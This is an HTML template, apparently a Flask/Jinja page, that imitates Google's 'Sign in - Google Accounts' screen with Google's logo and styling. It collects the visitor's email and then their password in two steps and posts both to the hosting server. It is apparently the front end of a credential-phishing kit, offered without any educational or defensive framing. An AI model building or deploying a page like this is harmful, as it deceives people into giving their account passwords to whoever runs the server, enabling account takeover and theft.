<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            background-color: #f8f9fa;
            color: #202124;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            width: 360px;
            padding: 24px;
            background-color: white;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            text-align: center;
        }
        .container img {
            width: 75px;
            margin-bottom: 16px;
        }
        .container h1 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
        }
        .container form {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }
        .input-field {
            width: 100%;
            padding: 12px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 14px;
        }
        .btn {
            background-color: #1a73e8;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }
        .btn:hover {
            background-color: #155ab2;
        }
        .error {
            color: #d93025;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google Logo">
        <h1>Sign in</h1>
        <p>Use your Google Account</p>
        <form method="POST">
            {% if not email_received %}
                <input type="email" name="email" class="input-field" placeholder="Email or phone" required>
                <button type="submit" class="btn">Next</button>
            {% else %}
                <p>{{ email }}</p>
                <input type="hidden" name="email" value="{{ email }}">
                <input type="password" name="password" class="input-field" placeholder="Enter your password" required>
                {% if error %}
                    <p class="error">{{ error }}</p>
                {% endif %}
                <button type="submit" class="btn">Next</button>
            {% endif %}
        </form>
    </div>
</body>
</html>
